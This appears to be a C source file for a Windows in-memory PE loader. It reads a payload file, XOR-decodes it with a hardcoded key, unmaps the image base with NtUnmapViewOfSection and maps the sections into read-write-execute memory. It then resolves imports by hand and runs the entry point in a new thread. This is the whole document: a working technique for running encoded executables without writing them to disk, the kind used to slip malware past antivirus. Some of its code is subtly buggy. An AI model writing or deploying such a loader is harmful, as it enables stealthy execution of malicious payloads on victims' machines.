#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

char *buffer = NULL; // Our main buffer where we store the file
int *fSize;          // File Size
size_t keySize = 28; // Key length
char *key = "wibwHeamKtvrdCiupvKHrajpqao";

void myMemCpy(void *dest, void *src, size_t n)
{
    // Typecast src and dest addresses to (char *)
    char *csrc = (char*)src;
    char *cdest = (char*)dest;
    
    // Copy contents of src[] to dest[]
    for (int i=0; i<n; i++)
        cdest[i] = csrc[i];
}

BOOL XOR(char* data, size_t data_len, char* key, size_t key_len) // XOR Function
{
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }

    return TRUE;
}

int readFile(LPCSTR file) // Opens a file, copies it onto the heap and encryptes the contents with random key
{
    HANDLE hFile;
    DWORD dwFileSize;
    DWORD dwBytesRead;
    //char *key;

    hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Cannot open the file (%ld)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    else
    {
        printf("[+] File %s successfully opened for reading!\n", file);
    }

    dwFileSize = GetFileSize(hFile,NULL);

    if (dwFileSize == INVALID_FILE_SIZE)
    {
        printf("[-] Cannot get file size (%ld)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    //printf("[+] File %s is %ld bytes large\n", file, dwFileSize);

    buffer = (char*) malloc(dwFileSize * sizeof(char));

    //printf("[+] HEAP Address of encrypted payload = %p\n", buffer);

    if (buffer == NULL)
    {
        printf("[-] Failed to allocate %ld bytes\n", dwFileSize);
        CloseHandle(hFile);
        return 1;
    }

    if (ReadFile(hFile, buffer, (dwFileSize-1), &dwBytesRead, NULL)== FALSE)
    {
        printf("[-] Failed reading the file (%ld)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (CloseHandle(hFile) != 0)
    {
        printf("[+] Closing file handle...\n");
        CloseHandle(hFile);
    }

    if(!XOR(buffer,(size_t)dwFileSize,key,keySize)) return 1;

    fSize = (int*) &dwFileSize;

    return 0;
}

BOOL checkPE(IMAGE_DOS_HEADER *pefile) // Check if File matches MZ signature
{
    if (pefile->e_magic == IMAGE_DOS_SIGNATURE)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

BOOL PE_fix_IAT(PVOID p_module,IMAGE_DATA_DIRECTORY* p_importdir) // Fix the Import Address Table
{
    if(p_importdir == NULL) return FALSE;

    unsigned long long size = p_importdir->Size;
    unsigned long long rva_addr = p_importdir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* p_library_desc = NULL;
    unsigned long long parsedsize = 0;

    for (; parsedsize < size; parsedsize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) 
    {
        p_library_desc = (IMAGE_IMPORT_DESCRIPTOR*)(rva_addr + parsedsize + (ULONG_PTR)p_module);

        if (p_library_desc->OriginalFirstThunk == 0 && p_library_desc->FirstThunk == 0) break;
        
        char* p_library_name = (char*)((ULONGLONG)p_module + p_library_desc->Name);

        unsigned long long call_via = p_library_desc->FirstThunk;
        unsigned long long thunk_addr = p_library_desc->OriginalFirstThunk;

        if (thunk_addr == 0) thunk_addr = p_library_desc->FirstThunk;

        unsigned long long offsetField = 0;
        unsigned long long offsetThunk = 0;
        
        while (TRUE)
        {
            size_t modaddr = (size_t)p_module;
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(modaddr + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(modaddr + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(p_library_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == 0) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function)
            {
                PIMAGE_IMPORT_BY_NAME p_by_name = (PIMAGE_IMPORT_BY_NAME)(modaddr + orginThunk->u1.AddressOfData);

                char* p_func_name = (char*)p_by_name->Name;
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(p_library_name), p_func_name);

                fieldThunk->u1.Function = addr;
            }

            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }

    return TRUE;
}

BOOL LoadPE(char *filepath) // Main LoadPE function that parses the file
{
    srand(time(NULL));

    if(readFile(filepath) != 0)
    {
        return FALSE;
    }

    IMAGE_DOS_HEADER* p_dosh = (IMAGE_DOS_HEADER*)buffer; // DOS Header Pointer

    if(!checkPE(p_dosh))
    {
        printf("[-] File %s is not executable\n", filepath);
        return FALSE;
    }

    IMAGE_NT_HEADERS* p_nth = (IMAGE_NT_HEADERS*) ((char*)p_dosh + p_dosh->e_lfanew);  // Cast to char pointer then add offset 0x0 to e_lfanew to get the offset of NT_HEADERS

    if(p_nth->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] File %s is not executable\n", filepath);
        return FALSE;
    }

    IMAGE_DATA_DIRECTORY* pe_reloc_dir = &(p_nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);

    if (!pe_reloc_dir)
    {
        printf("[-] Allocation has failed (%ld)",GetLastError());
        return FALSE;
    }

    LPVOID p_imagebaseaddr = (LPVOID)p_nth->OptionalHeader.ImageBase;

    HMODULE dll_addr = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll_addr, "NtUnmapViewOfSection"))((HANDLE)-1, p_imagebaseaddr);

    char* pImagebase = (char*)VirtualAlloc(p_imagebaseaddr, p_nth->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pImagebase) 
    {
        printf("[-] Allocation has failed (%ld)",GetLastError());
        return FALSE;
    }

    printf("\n[+] Allocating virtual memory at %p\n", pImagebase);

    printf("[+] Copying PE Header into memory\n");
    myMemCpy(pImagebase, buffer, p_nth->OptionalHeader.SizeOfHeaders);

    printf("[+] Sorting out the PE Sections\n");
    IMAGE_SECTION_HEADER* p_sec_headers = (IMAGE_SECTION_HEADER*)((size_t)p_nth + sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < p_nth->FileHeader.NumberOfSections; i++)
    {
        //printf("[+] Name:%s  RVA:%lX   PTR_RAW:%lX   SIZE_RAW:%lX\n", p_sec_headers[i].Name, p_sec_headers[i].VirtualAddress, p_sec_headers[i].PointerToRawData, p_sec_headers[i].SizeOfRawData);
        myMemCpy((LPVOID)((size_t)pImagebase + p_sec_headers[i].VirtualAddress), (LPVOID)((size_t)buffer + p_sec_headers[i].PointerToRawData), p_sec_headers[i].SizeOfRawData);
    }

    printf("[+] Fixing the PE Import Address Table\n");
    IMAGE_DATA_DIRECTORY* pe_import_dir = &(p_nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    if(!PE_fix_IAT(pImagebase, pe_import_dir))
    {
        printf("[-] Fixing the IAT failed!\n");
        return FALSE;
    }

    size_t retAddr = (size_t)(pImagebase)+p_nth->OptionalHeader.AddressOfEntryPoint;

    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)retAddr, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

int main (int argc, char *argv[])
{
    if (argc < 2 || argc > 2)
    {
        printf("Usage: %s <filename>", argv[0]);
        return 1;
    }

    if(!LoadPE(argv[1])) return 1;

    free(buffer);
    return 0;
}
